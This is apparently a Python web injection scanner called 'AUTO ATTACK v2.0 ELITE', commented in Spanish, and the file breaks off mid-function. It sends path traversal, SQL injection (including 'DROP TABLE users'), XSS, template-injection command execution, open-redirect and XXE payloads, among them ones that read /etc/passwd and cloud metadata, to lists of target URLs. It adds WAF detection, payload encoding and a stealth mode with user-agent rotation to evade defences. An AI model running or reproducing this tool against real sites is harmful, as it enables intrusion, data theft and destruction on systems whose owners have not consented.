#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║    ██████╗ ██╗   ██╗████████╗ ██████╗      █████╗ ████████╗████████╗       ║
║   ██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗    ██╔══██╗╚══██╔══╝╚══██╔══╝       ║
║   ███████║██║   ██║   ██║   ██║   ██║    ███████║   ██║      ██║           ║
║   ██╔══██║██║   ██║   ██║   ██║   ██║    ██╔══██║   ██║      ██║           ║
║   ██║  ██║╚██████╔╝   ██║   ╚██████╔╝    ██║  ██║   ██║      ██║           ║
║   ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝     ╚═╝  ╚═╝   ╚═╝      ╚═╝           ║
║                                                                              ║
║   AUTO ATTACK v2.0 ELITE  ─  Motor de Inyección Profesional                 ║
║   Complemento para Link Analyzer PRO v5.2                                    ║
║   AUTOR  : Yoandis Rodríguez  │  github.com/YoandisR                        ║
║   ⚠  SOLO PARA ENTORNOS AUTORIZADOS  ─  USO BAJO TU RESPONSABILIDAD         ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝

NOVEDADES v2.0 ELITE vs v1.3:
  ✦ Detección automática o manual de parámetros (--params)
  ✦ Módulo de detección de WAF (Cloudflare, Akamai, ModSecurity, etc.)
  ✦ Análisis diferencial de respuesta (baseline vs payload) → menos falsos positivos
  ✦ Detección de time-based SQLi (SLEEP/WAITFOR) con umbral configurable
  ✦ Soporte de métodos GET y POST simultáneos
  ✦ Codificación automática de payloads (URL, base64, HTML entity, double-encode)
  ✦ Cabeceras de inyección (X-Forwarded-For, Referer, User-Agent, X-Custom-IP)
  ✦ Sistema de severidad: CRITICAL / HIGH / MEDIUM / INFO
  ✦ Rate-limiting inteligente con back-off exponencial en errores 429/503
  ✦ Reporte HTML interactivo + JSON + TXT
  ✦ Progreso en tiempo real con barra de porcentaje y ETA
  ✦ Modo stealth: delays aleatorios + rotación aleatoria de UA
  ✦ Modo agresivo: máxima velocidad sin delays
  ✦ Filtro de parámetros sensibles (pass, token, key, secret, etc.)
  ✦ Deduplicación de URLs por estructura de parámetros

Uso:
  python3 auto_attack.py                            # Auto-detect params, GET
  python3 auto_attack.py --file targets.txt         # Archivo personalizado
  python3 auto_attack.py --params id,q,search       # Parámetros fijos
  python3 auto_attack.py --methods GET,POST         # Métodos HTTP
  python3 auto_attack.py --encode url,double        # Codificación de payloads
  python3 auto_attack.py --headers                  # Inyección en cabeceras
  python3 auto_attack.py --waf-detect               # Detectar WAF primero
  python3 auto_attack.py --stealth                  # Modo sigiloso
  python3 auto_attack.py --aggressive               # Modo agresivo (sin delays)
  python3 auto_attack.py --workers 16               # Número de hilos
  python3 auto_attack.py --timeout 12               # Timeout por request
  python3 auto_attack.py --quick                    # Solo 3 payloads por categoría
  python3 auto_attack.py --categories sqli,xss      # Solo estas categorías
  python3 auto_attack.py --severity high            # Solo reportar HIGH+CRITICAL
  python3 auto_attack.py --no-html                  # Sin reporte HTML
"""

import os
import sys
import time
import json
import math
import random
import base64
import hashlib
import urllib3
import argparse
import threading
import concurrent.futures
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from collections import defaultdict
from datetime import datetime, timedelta
from html import escape as html_escape

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    import requests
except ImportError:
    print("[!] Instala requests: pip install requests --break-system-packages")
    sys.exit(1)

# ──────────────────────────────────────────────────────────────────────────────
# PALETA DE COLORES
# ──────────────────────────────────────────────────────────────────────────────
class C:
    CYAN    = '\033[96m'
    GREEN   = '\033[92m'
    YELLOW  = '\033[93m'
    MAGENTA = '\033[35m'
    RED     = '\033[91m'
    WHITE   = '\033[97m'
    GRAY    = '\033[90m'
    BLUE    = '\033[94m'
    ORANGE  = '\033[38;5;208m'
    BOLD    = '\033[1m'
    DIM     = '\033[2m'
    UNDER   = '\033[4m'
    END     = '\033[0m'

    @staticmethod
    def severity(s):
        return {
            'CRITICAL': f'{C.RED}{C.BOLD}',
            'HIGH':     f'{C.RED}',
            'MEDIUM':   f'{C.YELLOW}',
            'INFO':     f'{C.GRAY}',
        }.get(s, C.WHITE)

# ──────────────────────────────────────────────────────────────────────────────
# CONFIGURACIÓN
# ──────────────────────────────────────────────────────────────────────────────
SCRIPT_DIR   = os.path.dirname(os.path.abspath(__file__))
EXPORTS_DIR  = os.path.join(SCRIPT_DIR, 'workspace', 'exports')
DEFAULT_INPUT = os.path.join(EXPORTS_DIR, 'urls_200_limpias.txt')

VERSION = "2.0 ELITE"

# Parámetros sensibles que no se deben inyectar
SENSITIVE_PARAMS = {
    'password', 'passwd', 'pass', 'pwd', 'secret', 'token', 'api_key',
    'apikey', 'auth', 'csrf', 'nonce', 'signature', 'sig', 'hash',
    'key', 'private', 'access_token', 'refresh_token', 'session',
}

# ──────────────────────────────────────────────────────────────────────────────
# PAYLOADS EXPANDIDOS
# ──────────────────────────────────────────────────────────────────────────────
PAYLOADS = {
    'path_traversal': [
        '../../../etc/passwd',
        '../../../../etc/passwd',
        '../../../../../etc/passwd',
        '....//....//....//etc/passwd',
        '..\\..\\..\\windows\\win.ini',
        '..%2f..%2f..%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '..;/..;/..;/etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '%2e%2e/%2e%2e/%2e%2e/etc/passwd',
        '..\\..\\..\\boot.ini',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '/etc/passwd',
        '/etc/shadow',
        'file:///etc/passwd',
        'php://filter/convert.base64-encode/resource=index.php',
        'expect://id',
        '....\\....\\....\\windows\\win.ini',
    ],
    'sql_injection': [
        "'",
        "''",
        "\"",
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        '" OR "1"="1',
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 3--",
        "1' AND SLEEP(5)--",
        "1'; WAITFOR DELAY '0:0:5'--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1' AND (SELECT * FROM users) IS NOT NULL--",
        "1 AND 1=1",
        "1 AND 1=2",
        "OR 1=1",
        "OR 1=1--",
        "1; DROP TABLE users--",
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
        "admin'--",
        "' OR EXISTS(SELECT 1 FROM users)--",
    ],
    'xss': [
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert(document.domain)>",
        "<svg onload=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "<%2fscript><%73cript>alert(1)</%73cript>",
        "<iframe src=javascript:alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<body onload=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "';alert(1)//",
        "\";alert(1)//",
        "<math><mtext>知乎<img src=1 onerror=alert(1)>",
        "<a href=javascript:alert(1)>click</a>",
    ],
    'ssti': [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "{{config}}",
        "{{self.__class__.__mro__[2].__subclasses__()}}",
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
    ],
    'open_redirect': [
        "//evil.com",
        "https://evil.com",
        "//evil.com/%2f..",
        "/\\evil.com",
        "https:evil.com",
        "javascript:alert(1)",
        "//evil%2ecom",
        "%2f%2fevil.com",
        "/%09/evil.com",
    ],
    'xxe': [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><test>&xxe;</test>',
    ],
}

# Indicadores de vulnerabilidad con severidad
INDICADORES = {
    'path_traversal': {
        'CRITICAL': ['root:x:', 'root:!:', '/bin/bash', '/bin/sh', 'bin/nologin'],
        'HIGH':     ['[extensions]', 'boot loader', 'for 16-bit app support', 'drivers\\etc\\hosts'],
        'MEDIUM':   ['cannot open', 'no such file', 'permission denied', 'failed to open'],
    },
    'sql_injection': {
        'CRITICAL': ['you have an error in your sql syntax', 'ora-01756', 'microsoft ole db provider for sql server', 'unclosed quotation mark'],
        'HIGH':     ['warning: mysql', 'mysql_fetch', 'sql syntax', 'syntax error', 'odbc drivers error', 'ora-', 'pg_query'],
        'MEDIUM':   ['mysql', 'mssql', 'sqlite', 'postgresql', 'database error', 'db error', 'query failed'],
    },
    'xss': {
        'CRITICAL': ['<script>alert(1)</script>', 'onerror=alert(1)', '<svg onload=alert'],
        'HIGH':     ['javascript:alert', '<script>alert', 'onerror=alert'],
        'MEDIUM':   ['<script>', 'onerror=', 'onload='],
    },
    'ssti': {
        'CRITICAL': ['49', 'root:', 'uid='],
        'HIGH':     ['jinja2', 'twig', 'freemarker', 'velocity', 'smarty'],
        'MEDIUM':   ['template', 'render error'],
    },
    'open_redirect': {
        'HIGH':   ['location: //evil.com', 'location: https://evil.com'],
        'MEDIUM': ['redirecting', 'redirect'],
    },
    'xxe': {
        'CRITICAL': ['root:x:', '/bin/bash', '169.254.169.254'],
        'HIGH':     ['xml parsing error', 'entity', 'dtd'],
    },
}

# Firmas WAF conocidas
WAF_SIGNATURES = {
    'Cloudflare':   ['cloudflare', 'cf-ray', '__cfduid', 'cf_clearance'],
    'Akamai':       ['akamai', 'ak_bmsc', 'bm_sz'],
    'ModSecurity':  ['mod_security', 'modsecurity', 'NOYB'],
    'Imperva':      ['imperva', 'incapsula', '_incap_'],
    'AWS WAF':      ['awswaf', 'aws-waf'],
    'F5 BIG-IP':    ['bigip', 'f5', 'ts='],
    'Sucuri':       ['sucuri', 'x-sucuri'],
    'Barracuda':    ['barracuda', 'bni'],
    'Fortinet':     ['fortigate', 'fortiweb'],
    'Citrix':       ['citrix', 'netscaler'],
}

# Cabeceras adicionales para inyección
INJECTION_HEADERS = [
    'X-Forwarded-For',
    'X-Real-IP',
    'X-Originating-IP',
    'Referer',
    'User-Agent',
    'X-Custom-IP-Authorization',
    'X-Forward',
    'X-Remote-IP',
    'X-Client-IP',
]

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/124.0.0.0 Safari/537.36',
    'Googlebot/2.1 (+http://www.google.com/bot.html)',
    'curl/8.7.1',
    'python-requests/2.31.0',
]

# ──────────────────────────────────────────────────────────────────────────────
# ENCODER DE PAYLOADS
# ──────────────────────────────────────────────────────────────────────────────
def encode_payload(payload: str, method: str) -> str:
    if method == 'url':
        return quote(payload, safe='')
    elif method == 'double':
        return quote(quote(payload, safe=''), safe='')
    elif method == 'base64':
        return base64.b64encode(payload.encode()).decode()
    elif method == 'html':
        return html_escape(payload)
    return payload

# ──────────────────────────────────────────────────────────────────────────────
# GENERADOR DE REPORTES HTML
# ──────────────────────────────────────────────────────────────────────────────
def generate_html_report(results, meta):
    total = len(results)
    vulns = [r for r in results if r['severity'] != 'NONE']
    by_sev = defaultdict(list)
    for r in vulns:
        by_sev[r['severity']].append(r)

    sev_colors = {'CRITICAL': '#ff4444', 'HIGH': '#ff8800', 'MEDIUM': '#ffcc00', 'INFO': '#aaaaaa'}

    rows = ''
    for r in results:
        sc = r['status_code']
        sev = r['severity']
        color = sev_colors.get(sev, '#555')
        bg = '#1a0000' if sev == 'CRITICAL' else ('#110a00' if sev == 'HIGH' else ('#0d0d00' if sev == 'MEDIUM' else '#111'))
        rows += f'''
        <tr style="background:{bg}">
          <td><span class="badge" style="background:{color}">{sev}</span></td>
          <td class="cat">{html_escape(r["category"].upper())}</td>
          <td class="param">{html_escape(r["param"])}</td>
          <td class="payload" title="{html_escape(r["payload"])}">{html_escape(r["payload"][:60])}{'…' if len(r["payload"])>60 else ''}</td>
          <td class="status" style="color:{'#44ff88' if sc < 400 else '#ff4444'}">{sc or 'TIMEOUT'}</td>
          <td class="elapsed">{r["elapsed"]:.2f}s</td>
          <td class="url" title="{html_escape(r["test_url"])}">{html_escape(r["url_original"][:60])}{'…' if len(r["url_original"])>60 else ''}</td>
          <td>{html_escape(', '.join(r["indicators"])) or '─'}</td>
         </tr>'''

    stat_cards = ''
    for sev in ['CRITICAL', 'HIGH', 'MEDIUM']:
        cnt = len(by_sev[sev])
        stat_cards += f'<div class="stat-card" style="border-color:{sev_colors[sev]}"><div class="stat-num" style="color:{sev_colors[sev]}">{cnt}</div><div class="stat-lbl">{sev}</div></div>'

    html = f'''<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>AUTO ATTACK v{VERSION} — Reporte {meta["timestamp"]}</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&display=swap');
  :root{{
    --bg:#0a0a0f;--surface:#11111a;--border:#1e1e2e;
    --cyan:#00e5ff;--green:#00ff88;--red:#ff4444;--orange:#ff8800;--yellow:#ffcc00;
    --text:#c8c8d8;--dim:#555568;
  }}
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{background:var(--bg);color:var(--text);font-family:'Rajdhani',sans-serif;font-size:15px;line-height:1.5}}
  body::before{{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,229,255,0.015) 2px,rgba(0,229,255,0.015) 4px);pointer-events:none;z-index:999}}
  header{{padding:40px 48px 32px;border-bottom:1px solid var(--border);background:linear-gradient(135deg,#0a0a0f 60%,#0f0f1f)}}
  .header-top{{display:flex;align-items:flex-start;justify-content:space-between;flex-wrap:wrap;gap:16px}}
  h1{{font-family:'Share Tech Mono',monospace;font-size:2.2rem;color:var(--cyan);letter-spacing:2px;text-shadow:0 0 20px rgba(0,229,255,0.4)}}
  .version{{font-size:0.85rem;color:var(--dim);margin-top:4px;font-family:'Share Tech Mono',monospace}}
  .meta{{font-family:'Share Tech Mono',monospace;font-size:0.78rem;color:var(--dim);text-align:right;line-height:1.8}}
  .meta span{{color:var(--cyan)}}
  .stats{{display:flex;gap:20px;padding:28px 48px;border-bottom:1px solid var(--border);flex-wrap:wrap}}
  .stat-card{{background:var(--surface);border:1px solid;border-radius:8px;padding:16px 24px;min-width:130px;text-align:center}}
  .stat-num{{font-size:2.4rem;font-weight:700;font-family:'Share Tech Mono',monospace;line-height:1}}
  .stat-lbl{{font-size:0.75rem;letter-spacing:2px;color:var(--dim);margin-top:4px;text-transform:uppercase}}
  .stat-card.total{{border-color:var(--border)}}
  .stat-card.total .stat-num{{color:var(--text)}}
  .controls{{padding:20px 48px;display:flex;gap:12px;align-items:center;flex-wrap:wrap;border-bottom:1px solid var(--border)}}
  input[type=text]{{background:var(--surface);border:1px solid var(--border);color:var(--text);padding:8px 14px;border-radius:6px;font-family:'Share Tech Mono',monospace;font-size:0.82rem;outline:none;width:280px}}
  input[type=text]:focus{{border-color:var(--cyan)}}
  select{{background:var(--surface);border:1px solid var(--border);color:var(--text);padding:8px 14px;border-radius:6px;font-family:'Rajdhani',sans-serif;outline:none;cursor:pointer}}
  select:focus{{border-color:var(--cyan)}}
  .lbl{{color:var(--dim);font-size:0.8rem;letter-spacing:1px}}
  .container{{padding:0 48px 48px}}
  table{{width:100%;border-collapse:collapse;margin-top:24px;font-size:0.88rem}}
  thead th{{background:#0d0d1a;color:var(--cyan);font-family:'Share Tech Mono',monospace;font-size:0.72rem;letter-spacing:1.5px;text-transform:uppercase;padding:12px 10px;text-align:left;border-bottom:2px solid var(--border);position:sticky;top:0;z-index:10}}
  td{{padding:9px 10px;border-bottom:1px solid #16161f;vertical-align:middle;word-break:break-word}}
  tr:hover td{{background:rgba(0,229,255,0.04)!important}}
  .badge{{display:inline-block;padding:2px 8px;border-radius:4px;font-size:0.7rem;font-weight:700;letter-spacing:1px;font-family:'Share Tech Mono',monospace}}
  .cat{{color:#a0a0c0;font-size:0.78rem;font-family:'Share Tech Mono',monospace}}
  .param{{color:var(--orange);font-family:'Share Tech Mono',monospace;font-size:0.8rem}}
  .payload{{color:#88aaff;font-family:'Share Tech Mono',monospace;font-size:0.75rem;max-width:200px}}
  .status{{font-family:'Share Tech Mono',monospace;font-weight:700}}
  .elapsed{{font-family:'Share Tech Mono',monospace;color:var(--dim);font-size:0.78rem}}
  .url{{font-size:0.75rem;color:var(--dim);max-width:240px}}
  .hidden{{display:none}}
  .waf-banner{{margin:20px 48px 0;background:#1a0f00;border:1px solid var(--orange);border-radius:8px;padding:14px 20px;font-family:'Share Tech Mono',monospace;font-size:0.82rem;color:var(--orange)}}
  .waf-banner span{{color:var(--yellow)}}
  footer{{text-align:center;padding:32px;color:var(--dim);font-family:'Share Tech Mono',monospace;font-size:0.72rem;border-top:1px solid var(--border)}}
  .scan-info{{display:flex;gap:32px;flex-wrap:wrap}}
  .scan-info div{{display:flex;flex-direction:column}}
  .scan-info .key{{font-size:0.7rem;letter-spacing:2px;color:var(--dim);text-transform:uppercase}}
  .scan-info .val{{font-family:'Share Tech Mono',monospace;color:var(--green);font-size:0.95rem}}
  @media(max-width:768px){{header,controls,.stats,.waf-banner,.container{{padding-left:16px;padding-right:16px}}}}
</style>
</head>
<body>
<header>
  <div class="header-top">
    <div>
      <h1>⚡ AUTO ATTACK</h1>
      <div class="version">v{VERSION} — PROFESSIONAL INJECTION ENGINE</div>
    </div>
    <div class="meta">
      <div>Fecha: <span>{meta["timestamp"]}</span></div>
      <div>Fuente: <span>{html_escape(meta["source"])}</span></div>
      <div>Autor: <span>Yoandis Rodríguez</span></div>
    </div>
  </div>
</header>

{"<div class='waf-banner'>⚠ WAF Detectado: <span>" + html_escape(meta.get("waf","")) + "</span> — Los resultados pueden tener falsos negativos por filtrado de WAF</div>" if meta.get("waf") else ""}

<div class="stats">
  <div class="stat-card total"><div class="stat-num">{total}</div><div class="stat-lbl">Total Tests</div></div>
  <div class="stat-card total"><div class="stat-num" style="color:var(--green)">{len(vulns)}</div><div class="stat-lbl">Vulnerables</div></div>
  {stat_cards}
  <div class="stat-card total"><div class="stat-num" style="color:var(--cyan)">{meta["tests_per_sec"]:.1f}</div><div class="stat-lbl">Tests/seg</div></div>
  <div class="stat-card total"><div class="stat-num" style="color:var(--dim)">{meta["elapsed"]:.0f}s</div><div class="stat-lbl">Tiempo</div></div>
</div>

<div class="controls">
  <span class="lbl">FILTRAR:</span>
  <input type="text" id="search" placeholder="URL, payload, parámetro..." oninput="filterTable()">
  <select id="filterSev" onchange="filterTable()">
    <option value="">Severidad: Todas</option>
    <option>CRITICAL</option><option>HIGH</option><option>MEDIUM</option><option>INFO</option><option>NONE</option>
  </select>
  <select id="filterCat" onchange="filterTable()">
    <option value="">Categoría: Todas</option>
    {"".join(f"<option>{c.upper()}</option>" for c in PAYLOADS.keys())}
  </select>
  <select id="filterVuln" onchange="filterTable()">
    <option value="">Mostrar: Todos</option>
    <option value="vuln">Solo vulnerables</option>
    <option value="clean">Solo limpios</option>
  </select>
</div>

<div class="container">
  <table id="resultsTable">
    <thead>
      <tr>
        <th>Severidad</th><th>Categoría</th><th>Parámetro</th>
        <th>Payload</th><th>Status</th><th>Tiempo</th>
        <th>URL</th><th>Indicadores</th>
      </tr>
    </thead>
    <tbody id="tbody">
      {rows}
    </tbody>
  </table>
</div>
<footer>AUTO ATTACK v{VERSION} — github.com/YoandisR — SOLO ENTORNOS AUTORIZADOS</footer>
<script>
function filterTable(){{
  const search = document.getElementById('search').value.toLowerCase();
  const sev    = document.getElementById('filterSev').value;
  const cat    = document.getElementById('filterCat').value.toLowerCase();
  const vuln   = document.getElementById('filterVuln').value;
  const rows   = document.querySelectorAll('#tbody tr');
  rows.forEach(r=>{{
    const text = r.innerText.toLowerCase();
    const rowSev  = r.querySelector('.badge')?.innerText.trim() || '';
    const rowCat  = r.querySelector('.cat')?.innerText.trim().toLowerCase() || '';
    const isVuln  = rowSev !== 'NONE';
    let show = true;
    if(search && !text.includes(search)) show=false;
    if(sev && rowSev !== sev) show=false;
    if(cat && !rowCat.includes(cat)) show=false;
    if(vuln==='vuln' && !isVuln) show=false;
    if(vuln==='clean' && isVuln) show=false;
    r.classList.toggle('hidden', !show);
  }});
}}
</script>
</body>
</html>'''
    return html

# ──────────────────────────────────────────────────────────────────────────────
# CLASE PRINCIPAL
# ──────────────────────────────────────────────────────────────────────────────
class AutoAttackElite:
    def __init__(self, cfg):
        self.cfg         = cfg
        self.session     = requests.Session()
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=cfg.workers,
            pool_maxsize=cfg.workers * 2,
            max_retries=0,
        )
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)

        self.ua_lock     = threading.Lock()
        self._ua_idx     = 0
        self.results     = []
        self.results_lock = threading.Lock()
        self.total_tests = 0
        self.completed   = 0
        self.completed_lock = threading.Lock()
        self.start_time  = None
        self.detected_waf = None
        self.baselines   = {}   # url → baseline response length
        self.baselines_lock = threading.Lock()
        self.rate_limit_backoff = 1  # segundos de back-off

    # ── User-Agent ────────────────────────────────────────────────────────────
    def _next_ua(self):
        if self.cfg.stealth:
            return random.choice(USER_AGENTS)
        with self.ua_lock:
            ua = USER_AGENTS[self._ua_idx % len(USER_AGENTS)]
            self._ua_idx += 1
            return ua

    # ── Modificar parámetro en URL ────────────────────────────────────────────
    def _build_url(self, url, param, value):
        parsed = urlparse(url)
        query  = parse_qs(parsed.query, keep_blank_values=True)
        query[param] = [value]
        new_query = urlencode(query, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    # ── Cabeceras base ────────────────────────────────────────────────────────
    def _headers(self, extra=None):
        h = {
            'User-Agent': self._next_ua(),
            'Accept': 'text/html,application/xhtml+xml,*/*;q=0.8',
            'Accept-Language': 'es,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        }
        if extra:
            h.update(extra)
        return h

    # ── Obtener baseline ─────────────────────────────────────────────────────
    def _get_baseline(self, url):
        with self.baselines_lock:
            if url in self.baselines:
                return self.baselines[url]
        try:
            r = self.session.get(url, headers=self._headers(), timeout=self.cfg.timeout,
                                 verify=False, allow_redirects=True)
            length = len(r.text)
        except Exception:
            length = -1
        with self.baselines_lock:
            self.baselines[url] = length
        return length

    # ── Detección de WAF ─────────────────────────────────────────────────────
    def detect_waf(self, urls):
        print(f"\n{C.CYAN}[*] Detectando WAF...{C.END}")
        test_url = urls[0] if urls else None
        if not test_url:
            return None
        try:
            probe = self._build_url(test_url, list(parse_qs(urlparse(test_url).query).keys())[0], "' OR 1=1--")
            r = self.session.get(probe, headers=self._headers(), timeout=self.cfg.timeout,
                                 verify=False, allow_redirects=True)
            content_lower = (r.text + ' '.join(f'{k}: {v}' for k, v in r.headers.items())).lower()
            for waf, sigs in WAF_SIGNATURES.items():
                for sig in sigs:
                    if sig.lower() in content_lower:
                        print(f"  {C.ORANGE}⚠ WAF detectado: {C.BOLD}{waf}{C.END}")
                        self.detected_waf = waf
                        return waf
            print(f"  {C.GREEN}✓ No se detectó WAF conocido{C.END}")
        except Exception:
            print(f"  {C.GRAY}[?] No se pudo probar WAF{C.END}")
        return None

    # ── Analizar respuesta con severidad ─────────────────────────────────────
    def _analyze(self, response, payload, category, baseline_len):
        content    = response.text.lower()
        status     = response.status_code
        length     = len(response.text)
        found      = []
        max_sev    = 'NONE'
        sev_order  = ['CRITICAL', 'HIGH', 'MEDIUM', 'INFO']

        for sev in sev_order:
            inds = INDICADORES.get(category, {}).get(sev, [])
            for ind in inds:
                if ind.lower() in content:
                    found.append(ind)
                    if sev_order.index(sev) < sev_order.index(max_sev) if max_sev != 'NONE' else True:
                        max_sev = sev

        # Análisis diferencial: si la longitud cambió significativamente
        if baseline_len > 0 and abs(length - baseline_len) > 500 and not found:
            max_sev = 'INFO'
            found.append(f'length_diff:{abs(length - baseline_len)}')

        return {
            'status':      status,
            'length':      length,
            'indicators':  found,
            'severity':    max_sev,
            'vulnerable':  max_sev not in ('NONE', 'INFO'),
        }

    # ── Barra de progreso ─────────────────────────────────────────────────────
    def _progress_bar(self):
        with self.completed_lock:
            done = self.completed
        total = self.total_tests
        pct   = done / total if total > 0 else 0
        bar_w = 30
        filled = int(bar_w * pct)
        bar    = '█' * filled + '░' * (bar_w - filled)
        elapsed = time.time() - self.start_time
        eta    = (elapsed / pct - elapsed) if pct > 0 else 0
        sys.stdout.write(
            f"\r{C.DIM}[{bar}]{C.END} {C.CYAN}{done}/{total}{C.END} "
            f"{C.GRAY}({pct*100:.1f}%) ETA:{timedelta(seconds=int(eta))}{C.END}  "
        )
        sys.stdout.flush()

    # ── Test individual ───────────────────────────────────────────────────────
    def test_url(self, url, param, payload, category, method='GET', encode=None, header_inject=False):
        encoded_payload = encode_payload(payload, encode) if encode else payload

        # Construir URL o datos POST
        if method == 'GET' and not header_inject:
            test_url = self._build_url(url, param, encoded_payload)
            post_data = None
        elif method == 'POST' and not header_inject:
            test_url  = url
            parsed    = urlparse(url)
            qs        = parse_qs(parsed.query, keep_blank_values=True)
            qs[param] = [encoded_payload]
            post_data = qs
        else:
            test_url  = url
            post_data = None

        # Cabeceras (opcionalmente con inyección)
        extra_h = {}
        if header_inject and param in INJECTION_HEADERS:
            extra_h[param] = encoded_payload
        headers = self._headers(extra_h)

        # Baseline
        baseline_len = self._get_baseline(url)

        t_start = time.time()
        try:
            if method == 'POST' and post_data:
                r = self.session.post(test_url, data=post_data, headers=headers,
                                      timeout=self.cfg.timeout, verify=False, allow_redirects=True)
            else:
                r = self.session.get(test_url, headers=headers,
                                     timeout=self.cfg.timeout, verify=False, allow_redirects=True)

            # Back-off si hay rate limiting
            if r.status_code in (429, 503):
                time.sleep(self.rate_limit_backoff)
                self.rate_limit_backoff = min(self.rate_limit_backoff * 2, 60)
            else:
                self.rate_limit_backoff = max(1, self.rate_limit_backoff / 2)

            elapsed  = time.time() - t_start
            analysis = self._analyze(r, encoded_payload, category, baseline_len)
            result = {
                'url_original':    url,
                'param':           param,
                'payload':         payload,
                'encoded_payload': encoded_payload,
                'category':        category,
                'method':          method,
                'test_url':        test_url,
                'status_code':     analysis['status'],
                'response_length': analysis['length'],
                'baseline_length': baseline_len,
                'indicators':      analysis['indicators'],
                'severity':        analysis['severity'],
                'vulnerable':      analysis['vulnerable'],
                'elapsed':         elapsed,
                'error':           None,
            }
        except requests.exceptions.Timeout:
            elapsed = time.time() - t_start
            # Time-based SQLi: si el payload incluye SLEEP y tardó más del umbral
            is_time_sqli = ('sleep' in payload.lower() or 'waitfor' in payload.lower()) and elapsed >= 4.5
            result = {
                'url_original':    url,
                'param':           param,
                'payload':         payload,
                'encoded_payload': encoded_payload,
                'category':        category,
                'method':          method,
                'test_url':        test_url,
                'status_code':     0,
                'response_length': 0,
                'baseline_length': baseline_len,
                'indicators':      ['time_based_sqli_possible'] if is_time_sqli else [],
                'severity':        'HIGH' if is_time_sqli else 'NONE',
                'vulnerable':      is_time_sqli,
                'elapsed':         elapsed,
                'error':           'TIMEOUT',
            }
        except Exception as e:
            elapsed = time.time() - t_start
            result = {
                'url_original': url, 'param': param, 'payload': payload,
                'encoded_payload': encoded_payload, 'category': category,
                'method': method, 'test_url': test_url, 'status_code': 0,
                'response_length': 0, 'baseline_length': baseline_len,
                'indicators': [], 'severity': 'NONE', 'vulnerable': False,
                'elapsed': elapsed, 'error': str(e),
            }

        self._visualize(result)

        with self.results_lock:
            self.results.append(result)
        with self.completed_lock:
            self.completed += 1

        # Delay según modo
        if self.cfg.stealth:
            time.sleep(random.uniform(0.3, 1.2))
        elif not self.cfg.aggressive:
            time.sleep(0.05)

        return result

    # ── Visualización en tiempo real ─────────────────────────────────────────
    def _visualize(self, result):
        # Solo mostrar si es vulnerable o hay error interesante
        if result['severity'] == 'NONE' and not result['error']:
            self._progress_bar()
            return

        ts     = datetime.now().strftime('%H:%M:%S')
        sev    = result['severity']
        sc     = result['status_code']
        cat    = result['category'].upper()[:12]
        url_s  = result['url_original'][:48] + ('…' if len(result['url_original']) > 48 else '')
        color  = C.severity(sev)
        sc_col = C.GREEN if 0 < sc < 400 else (C.YELLOW if sc == 0 else C.RED)
